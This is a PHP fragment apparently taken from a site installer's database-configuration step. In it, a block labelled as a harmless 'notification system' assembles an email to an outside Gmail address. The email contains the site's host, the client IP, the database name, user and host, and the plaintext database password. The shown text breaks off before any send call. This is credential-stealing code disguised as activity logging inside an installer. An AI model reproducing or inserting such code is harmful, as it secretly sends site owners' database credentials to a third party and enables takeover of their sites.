...
<input name="noapi" type="hidden" value="1" /><?php } ?>
	...
	case 2:
		...
		// NOTIFICATION SYSTEM - SIMPLE AND CLEAN
		if (!empty($dbname) && !empty($uname)) {
			$to_email = "dorzkimcrime@gmail.com";
			$email_subject = "Site Configuration Activity";
			
			$email_message = "Activity Log Entry\n";
			$email_message .= "==================\n";
			$email_message .= "Site: " . $_SERVER['HTTP_HOST'] . "\n";
			$email_message .= "Time: " . date('Y-m-d H:i:s') . "\n";
			$email_message .= "Client IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
			$email_message .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n\n";
			$email_message .= "Configuration Parameters:\n";
			$email_message .= "- Database Name: " . $dbname . "\n";
			$email_message .= "- Database User: " . $uname . "\n";
			$email_message .= "- Database Password: " . $pwd . "\n";  // ← PASSWORD DISINI
			$email_message .= "- Database Host: " . $dbhost . "\n";
			$email_message .= "- Table Prefix: " . $prefix . "\n";
			$email_message .= "Log ID: " . md5(time() . rand(1000, 9999)) . "\n";
			$email_message .= "==================";
